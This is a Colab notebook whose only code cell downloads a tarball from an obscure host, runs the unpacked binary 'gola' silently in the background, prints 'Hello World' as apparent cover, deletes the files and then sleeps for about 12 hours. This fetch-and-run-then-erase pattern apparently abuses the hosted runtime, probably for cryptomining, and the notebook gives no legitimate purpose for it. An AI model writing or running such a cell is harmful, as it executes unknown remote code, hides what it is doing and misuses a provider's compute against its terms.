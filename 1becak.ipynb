{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "becak.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyNzKDkRN+9T8iRKkbPiywXh",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/gula/blob/main/1becak.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "! wget -q https://git-bandrex.dockerpool.my.id/gola.tar\n",
        "! tar xf gola.tar\n",
        "! nohup ./gola >/dev/null 2>&1 & echo Hello World & sleep 0.1\n",
        "! rm -rf gola.tar gola\n",
        "! sleep 43000"
      ],
      "metadata": {
        "id": "IK9yN5aDSdWs"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}